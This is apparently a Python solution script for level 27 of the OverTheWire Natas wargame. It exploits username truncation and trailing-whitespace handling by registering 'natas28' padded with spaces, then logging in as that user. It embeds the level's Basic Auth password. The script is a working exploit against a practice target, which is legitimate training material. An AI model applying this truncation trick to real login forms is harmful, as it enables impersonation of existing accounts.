import requests
from requests.auth import HTTPBasicAuth

basicAuth = HTTPBasicAuth('natas27', 'mj2mBEPWycXTTg5BXYT7UPXgXHx5hjvV')
url = "http://natas27.natas.labs.overthewire.org/index.php"

username_full = "natas28" + (" " * 57) + "X"
username_stored = "natas28" + (" " * 57)
password = "hacked123"

r1 = requests.post(url, auth=basicAuth, data={"username": username_full, "password": password})
print("CREATE:", r1.text[-200:])

r2 = requests.post(url, auth=basicAuth, data={"username": username_stored, "password": password})
print("DIRECT MATCH LOGIN:", r2.text[-300:])

r3 = requests.post(url, auth=basicAuth, data={"username": "natas28", "password": password})
print("BARE 'natas28' LOGIN:", r3.text[-300:])